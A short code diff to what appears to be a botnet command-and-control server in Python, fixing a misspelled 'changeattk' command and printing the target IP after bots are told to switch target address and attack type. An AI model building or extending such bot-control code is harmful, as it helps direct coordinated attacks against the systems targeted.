@@ -131,9 +131,11 @@ class Server():
             # TODO check if valid ip/address
             self._bot_broadcast(f'changeip:{body}'.encode(ENCODING))
             self.target_address = body
+            # Reflects change in target IP
+            print(f'Target IP is: {self.target_address}')
             return
-        elif type == 'changattk':
-            # TODO check if valid attack
+        elif type == 'changeattk':
+            # TODO: check if valid attack
             self._bot_broadcast(f'changeattk:{body}'.encode(ENCODING))
             self.attk_type = body
             return
